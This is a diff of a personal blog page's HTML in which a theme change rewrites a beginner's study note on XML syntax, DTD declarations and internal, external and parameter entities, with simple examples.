@@ -1,652 +1,471 @@
 <!DOCTYPE html>
+<html class="has-navbar-fixed-top">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+<title>了解XML - Threezh1&#39;s blog</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.css">
 
 
 
 
-
-<html lang="Chinese">
-<head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/head.jpg?v=7.3.0">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/head.jpg?v=7.3.0">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/head.jpg?v=7.3.0">
-  <link rel="mask-icon" href="/images/head.jpg?v=7.3.0" color="#222">
-
-<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+<meta name="description" content="Share learn & Share life.">
 
 
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+<meta name="keywords" content="Threezh1">
 
 
-<script id="hexo-configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Pisces',
-    version: '7.3.0',
-    exturl: false,
-    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
-    copycode: {"enable":false,"show_result":false,"style":null},
-    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
-    bookmark: {"enable":false,"color":"#222","save":"auto"},
-    fancybox: false,
-    mediumzoom: false,
-    lazyload: false,
-    pangu: false,
-    algolia: {
-      appID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    },
-    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
-    path: '',
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    translation: {
-      copy_button: 'Kopieren',
-      copy_success: 'Kopiert',
-      copy_failure: 'Kopieren fehlgeschlagen'
-    }
-  };
-</script>
 
-  <meta name="description" content="Learn：http://www.w3school.com.cn/xml/xml_intro.asp Simple note：XMLA simple example of XML： 12345678910111213&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;ISO-8859-1 ?&amp;gt;&amp;lt;skate&amp;gt;	&amp;lt;people  gr">
+    <meta name="description" content="Learn&amp;#xFF1A;http://www.w3school.com.cn/xml/xml_intro.asp Simple note&amp;#xFF1A;XMLA simple example of XML&amp;#xFF1A; 27">
 <meta name="keywords" content="XML">
 <meta property="og:type" content="article">
 <meta property="og:title" content="了解XML">
 <meta property="og:url" content="http://yoursite.com/2019/01/01/XXE_Note/index.html">
 <meta property="og:site_name" content="Threezh1&#39;s blog">
-<meta property="og:description" content="Learn：http://www.w3school.com.cn/xml/xml_intro.asp Simple note：XMLA simple example of XML： 12345678910111213&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;ISO-8859-1 ?&amp;gt;&amp;lt;skate&amp;gt;	&amp;lt;people  gr">
+<meta property="og:description" content="Learn&amp;#xFF1A;http://www.w3school.com.cn/xml/xml_intro.asp Simple note&amp;#xFF1A;XMLA simple example of XML&amp;#xFF1A; 27">
 <meta property="og:locale" content="Chinese">
-<meta property="og:updated_time" content="2019-08-23T06:19:04.315Z">
+<meta property="og:updated_time" content="2020-02-12T14:06:31.472Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="了解XML">
-<meta name="twitter:description" content="Learn：http://www.w3school.com.cn/xml/xml_intro.asp Simple note：XMLA simple example of XML： 12345678910111213&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;ISO-8859-1 ?&amp;gt;&amp;lt;skate&amp;gt;	&amp;lt;people  gr">
-  <link rel="canonical" href="http://yoursite.com/2019/01/01/XXE_Note/">
-
-
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome: false,
-    isPost: true,
-    isPage: false,
-    isArchive: false
-  };
-</script>
-
-  <title>了解XML | Threezh1's blog</title>
-  <meta name="generator" content="Hexo 3.8.0">
-  
-
-
-  <script>
-    var _hmt = _hmt || [];
-    (function() {
-      var hm = document.createElement("script");
-      hm.src = "https://hm.baidu.com/hm.js?41896264c6b7bfbb2d9ae9719e4440c2";
-      var s = document.getElementsByTagName("script")[0];
-      s.parentNode.insertBefore(hm, s);
-    })();
-  </script>
+<meta name="twitter:description" content="Learn&amp;#xFF1A;http://www.w3school.com.cn/xml/xml_intro.asp Simple note&amp;#xFF1A;XMLA simple example of XML&amp;#xFF1A; 27">
 
 
 
 
 
+<link rel="icon" href="/favicon.png">
 
-  <noscript>
-  <style>
-  .use-motion .motion-element,
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
 
-  .use-motion .logo,
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/bulma/0.6.2/css/bulma.min.css">
 
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/css/justifiedGallery.min.css">
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css">
+
+<link rel="stylesheet" href="/css/style.css">
+
+<script defer src="//use.fontawesome.com/releases/v5.0.8/js/all.js"></script>
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
 
 </head>
-
-<body itemscope itemtype="http://schema.org/WebPage" lang="Chinese">
-  <div class="container use-motion">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta">
-
-    <div>
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Threezh1's blog</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-        <p class="site-subtitle">分享学习、分享想法</p>
-      
-  </div>
-
-  <div class="site-nav-toggle">
-    <button aria-label="Navigationsleiste an/ausschalten">
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-    </button>
-  </div>
-</div>
-
-
-<nav class="site-nav">
-  
-  <ul id="menu" class="menu">
-      
-      
-      
-        
-        <li class="menu-item menu-item-home">
-      
+<body>
     
-
-    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Startseite</a>
-
-  </li>
-      
-      
-      
-        
-        <li class="menu-item menu-item-archives">
-      
-    
-
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archiv</a>
-
-  </li>
-      
-      
-      
-        
-        <li class="menu-item menu-item-threeday">
-      
-    
-
-    <a href="http://119.3.219.188/" rel="noopener" target="_blank"><i class="menu-item-icon fa fa-fw fa-Threeday"></i> <br>Threeday</a>
-
-  </li>
-  </ul>
-
-</nav>
-</div>
-    </header>
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-            
-
-          <div id="content" class="content page-post-detail">
-            
-
-  <div id="posts" class="posts-expand">
-    
-
-  <article class="post" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/01/XXE_Note/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Threezh1">
-      <meta itemprop="description" content="Share learn & Share life.">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Threezh1's blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">了解XML
-
-          
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Veröffentlicht am</span>
-
-              
+<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
+    <div class="container">
+        <div class="navbar-brand">
+            <a class="navbar-item navbar-logo" href="/">
                 
-              
-
-              <time title="Erstellt: 2019-01-01 12:00:00" itemprop="dateCreated datePublished" datetime="2019-01-01T12:00:00+08:00">2019-01-01</time>
-            </span>
-          
-            
-
-            
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">Bearbeitet am</span>
-                <time title="Geändert am: 2019-08-23 14:19:04" itemprop="dateModified" datetime="2019-08-23T14:19:04+08:00">2019-08-23</time>
-              </span>
-            
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">in</span>
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Learning/" itemprop="url" rel="index"><span itemprop="name">Learning</span></a></span>
-
+                <img src="/images/logo.png" alt height="28">
                 
-                
-              
-            </span>
-          
-
-          
-
+            </a>
+            <div class="navbar-burger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
         </div>
-      </header>
+        
+        <div class="navbar-menu navbar-start">
+            
+            <a class="navbar-item " href="/archives">归档</a>
+            
+            <a class="navbar-item " href="/Projects">项目</a>
+            
+            <a class="navbar-item " href="/Life">生活</a>
+            
+            <a class="navbar-item " href="/Photography">摄影</a>
+            
+            <a class="navbar-item " href="/About">关于</a>
+            
+            <a class="navbar-item " href="http://119.3.219.188/">Threeday</a>
+            
+        </div>
+        
+        <div class="navbar-menu navbar-end">
+            
+            <a class="navbar-item search" title="Buscar" href="javascript:;">
+                <i class="fas fa-search"></i>
+            </a>
+            
+            
+            
+            <a class="navbar-item" title="GitHub" href="https://github.com/Threezh1">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+               
+            
+        </div>
+    </div>
+</nav>
 
+    <section class="section">
+    <div class="container">
+    <article class="article content gallery" itemscope itemprop="blogPost">
+    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
+        
+            了解XML
+        
+    </h1>
+    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
+        <span class="column is-narrow">
+            <time datetime="2019-01-01T04:00:00.000Z" itemprop="datePublished">Jan 1 2019</time>
+        </span>
+        
+        <span class="column is-narrow article-category">
+            <i class="far fa-folder"></i>
+            <a class="article-category-link" href="/categories/技术文章/">技术文章</a>
+        </span>
+        
+        
+        <span class="column is-narrow">
+            
+            
+            6 minutes de lectura (Alrededor de 904 palabras)
+        </span>
+        
+    </div>
+    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
     
-    
-    
-    <div class="post-body" itemprop="articleBody">
+        <p>Learn&#xFF1A;<a href="http://www.w3school.com.cn/xml/xml_intro.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/xml/xml_intro.asp</a></p>
+<h2 id="Simple-note&#xFF1A;"><a href="#Simple-note&#xFF1A;" class="headerlink" title="Simple note&#xFF1A;"></a>Simple note&#xFF1A;</h2><h3 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h3><p>A simple example of XML&#xFF1A;</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1 ?&gt;</span><br><span class="line">&lt;skate&gt;</span><br><span class="line">	&lt;people  grade=&quot;four&quot;&gt;</span><br><span class="line">		&lt;name&gt;azhu&lt;/name&gt;</span><br><span class="line">		&lt;high&gt; three board &lt;/high&gt;</span><br><span class="line">	&lt;/people&gt;</span><br><span class="line">	&lt;people  grade=&quot;one&quot;&gt;</span><br><span class="line">		&lt;name&gt;threezhi&lt;/name&gt;</span><br><span class="line">		&lt;high&gt; three board &lt;/high&gt;</span><br><span class="line">	&lt;/people&gt;</span><br><span class="line">&lt;/skate&gt;</span><br><span class="line"></span><br><span class="line">`&lt;!-- You should avoid use attribute of XML. --&gt;`</span><br></pre></td></tr></table></figure>
 
-      
-        <p>Learn：<a href="http://www.w3school.com.cn/xml/xml_intro.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/xml/xml_intro.asp</a></p>
-<h2 id="Simple-note："><a href="#Simple-note：" class="headerlink" title="Simple note："></a>Simple note：</h2><h3 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h3><p>A simple example of XML：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1 ?&gt;</span><br><span class="line">&lt;skate&gt;</span><br><span class="line">	&lt;people  grade=&quot;four&quot;&gt;</span><br><span class="line">		&lt;name&gt;azhu&lt;/name&gt;</span><br><span class="line">		&lt;high&gt; three board &lt;/high&gt;</span><br><span class="line">	&lt;/people&gt;</span><br><span class="line">	&lt;people  grade=&quot;one&quot;&gt;</span><br><span class="line">		&lt;name&gt;threezhi&lt;/name&gt;</span><br><span class="line">		&lt;high&gt; three board &lt;/high&gt;</span><br><span class="line">	&lt;/people&gt;</span><br><span class="line">&lt;/skate&gt;</span><br><span class="line"></span><br><span class="line">`&lt;!-- You should avoid use attribute of XML. --&gt;`</span><br></pre></td></tr></table></figure>
-<p>In XML, there are five predefined entity reference(实体引用):</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp;lt;	&lt;</span><br><span class="line">&amp;gt;	&gt;</span><br><span class="line">&amp;amp;	&amp;</span><br><span class="line">&amp;apos;	&apos;</span><br><span class="line">&amp;quot;	&quot;</span><br></pre></td></tr></table></figure>
 <a id="more"></a>
-<p>A example of load an XML document to XML parser(解释器) :</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">if (window.XMLHttpRequest)</span><br><span class="line">&#123;// code for IE7+, Firefox, Chrome, Opera, Safari</span><br><span class="line">	xmlhttp=new XMLHttpRequest();</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	// code for IE6, IE5</span><br><span class="line">	xmlhttp=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">xmlhttp.open(&quot;GET&quot;,&quot;note.xml&quot;,false);</span><br><span class="line">xmlhttp.send();</span><br><span class="line">xmlDoc=xmlhttp.responseXML;</span><br><span class="line"></span><br><span class="line">document.getElementById(&quot;to&quot;).innerHTML=xmlDoc.getElementsByTagName(&quot;to&quot;)[0].childNodes[0].nodeValue;</span><br><span class="line">document.getElementById(&quot;from&quot;).innerHTML=xmlDoc.getElementsByTagName(&quot;from&quot;)[0].childNodes[0].nodeValue;</span><br><span class="line">document.getElementById(&quot;message&quot;).innerHTML=xmlDoc.getElementsByTagName(&quot;body&quot;)[0].childNodes[0].nodeValue;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>In XML, there are five predefined entity reference(&#x5B9E;&#x4F53;&#x5F15;&#x7528;):</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp;lt;	&lt;</span><br><span class="line">&amp;gt;	&gt;</span><br><span class="line">&amp;amp;	&amp;</span><br><span class="line">&amp;apos;	&apos;</span><br><span class="line">&amp;quot;	&quot;</span><br></pre></td></tr></table></figure>
+
+<p>A example of load an XML document to XML parser(&#x89E3;&#x91CA;&#x5668;) :</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">if (window.XMLHttpRequest)</span><br><span class="line">{// code for IE7+, Firefox, Chrome, Opera, Safari</span><br><span class="line">	xmlhttp=new XMLHttpRequest();</span><br><span class="line">}else{</span><br><span class="line">	// code for IE6, IE5</span><br><span class="line">	xmlhttp=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">xmlhttp.open(&quot;GET&quot;,&quot;note.xml&quot;,false);</span><br><span class="line">xmlhttp.send();</span><br><span class="line">xmlDoc=xmlhttp.responseXML;</span><br><span class="line"></span><br><span class="line">document.getElementById(&quot;to&quot;).innerHTML=xmlDoc.getElementsByTagName(&quot;to&quot;)[0].childNodes[0].nodeValue;</span><br><span class="line">document.getElementById(&quot;from&quot;).innerHTML=xmlDoc.getElementsByTagName(&quot;from&quot;)[0].childNodes[0].nodeValue;</span><br><span class="line">document.getElementById(&quot;message&quot;).innerHTML=xmlDoc.getElementsByTagName(&quot;body&quot;)[0].childNodes[0].nodeValue;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
 <h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><p>A example about DTD in XML:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1 ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE skate[</span><br><span class="line">	&lt;!ELEMENT people (name, high)&gt;</span><br><span class="line">	&lt;!ELEMENT name 		(#PCDATA)&gt; </span><br><span class="line">	&lt;!ELEMENT high 		(#PCDATA)&gt; </span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;skate&gt;</span><br><span class="line">	&lt;people  grade=&quot;four&quot;&gt;</span><br><span class="line">		&lt;name&gt;azhu&lt;/name&gt;</span><br><span class="line">		&lt;high&gt; three board &lt;/high&gt;</span><br><span class="line">	&lt;/people&gt;</span><br><span class="line">	&lt;people  grade=&quot;one&quot;&gt;</span><br><span class="line">		&lt;name&gt;threezhi&lt;/name&gt;</span><br><span class="line">		&lt;high&gt; three board &lt;/high&gt;</span><br><span class="line">	&lt;/people&gt;</span><br><span class="line">&lt;/skate&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1 ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE skate[</span><br><span class="line">	&lt;!ELEMENT people (name, high)&gt;</span><br><span class="line">	&lt;!ELEMENT name 		(#PCDATA)&gt; </span><br><span class="line">	&lt;!ELEMENT high 		(#PCDATA)&gt; </span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;skate&gt;</span><br><span class="line">	&lt;people  grade=&quot;four&quot;&gt;</span><br><span class="line">		&lt;name&gt;azhu&lt;/name&gt;</span><br><span class="line">		&lt;high&gt; three board &lt;/high&gt;</span><br><span class="line">	&lt;/people&gt;</span><br><span class="line">	&lt;people  grade=&quot;one&quot;&gt;</span><br><span class="line">		&lt;name&gt;threezhi&lt;/name&gt;</span><br><span class="line">		&lt;high&gt; three board &lt;/high&gt;</span><br><span class="line">	&lt;/people&gt;</span><br><span class="line">&lt;/skate&gt;</span><br></pre></td></tr></table></figure>
+
 <p>External document declaration:</p>
 <p><code>&lt;!DOCTYPE skate SYSTEM &quot;file_path&quot;&gt;</code></p>
 <p>PCDATA means parsed character data. The tags in the text will be handled as a flag and the entity will be expand.</p>
 <p>CDATA means character data and it will not be expand.</p>
 <p>In DTD , declare an element and a attribute.:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT Element_name category&gt;</span><br><span class="line">&lt;!ELEMENT Element_name (content)&gt;</span><br><span class="line">&lt;!ELEMENT Element_name (Elemnt1, Element2...)&gt;</span><br><span class="line"></span><br><span class="line">Empty Element:</span><br><span class="line">&lt;!ELEMENT Element_name, EMPTY&gt;</span><br><span class="line"></span><br><span class="line">An element who just have PCDATA should use #PCDATA to declare.</span><br><span class="line"></span><br><span class="line">&lt;!ATTLIST name type category defaults&gt;</span><br><span class="line">&lt;!ATTLIST payment type CDATA &quot;check&quot;&gt;</span><br></pre></td></tr></table></figure>
-<p>DTD - Entity(实体):</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT Element_name category&gt;</span><br><span class="line">&lt;!ELEMENT Element_name (content)&gt;</span><br><span class="line">&lt;!ELEMENT Element_name (Elemnt1, Element2...)&gt;</span><br><span class="line"></span><br><span class="line">Empty Element:</span><br><span class="line">&lt;!ELEMENT Element_name, EMPTY&gt;</span><br><span class="line"></span><br><span class="line">An element who just have PCDATA should use #PCDATA to declare.</span><br><span class="line"></span><br><span class="line">&lt;!ATTLIST name type category defaults&gt;</span><br><span class="line">&lt;!ATTLIST payment type CDATA &quot;check&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>DTD - Entity(&#x5B9E;&#x4F53;):</p>
 <p>A entity declare:</p>
 <p>Internal entity:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">DTD:</span><br><span class="line">&lt;!ENTITY name &quot;value&quot;&gt;</span><br><span class="line">&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;</span><br><span class="line"></span><br><span class="line">XML:</span><br><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">DTD:</span><br><span class="line">&lt;!ENTITY name &quot;value&quot;&gt;</span><br><span class="line">&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;</span><br><span class="line"></span><br><span class="line">XML:</span><br><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</span><br></pre></td></tr></table></figure>
+
 <p>External entity:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DTD:</span><br><span class="line">&lt;!ENTITY writer SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">XML:</span><br><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</span><br></pre></td></tr></table></figure>
-<p>Parameter entity:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY %entity_name &quot;value&quot;&gt;</span><br><span class="line">&lt;!ENTITY %entity_name SYSTEM &quot;URL&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DTD:</span><br><span class="line">&lt;!ENTITY writer SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">XML:</span><br><span class="line">&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Parameter entity:</p>
+<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY %entity_name &quot;value&quot;&gt;</span><br><span class="line">&lt;!ENTITY %entity_name SYSTEM &quot;URL&quot;&gt;</span><br></pre></td></tr></table></figure>
+
 <h2 id="Try"><a href="#Try" class="headerlink" title="Try"></a>Try</h2><p>This is a internal entity:</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="ISO-8859-1" ?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE note[</span></span><br><span class="line"><span class="meta">	&lt;!ELEMENT note (name)&gt; </span></span><br><span class="line"><span class="meta">	&lt;!ENTITY fuck "You"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;fuck;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>I don’t know why that I can’t build a xml within external entity successfully. So I wanan put it away in this time.</p>
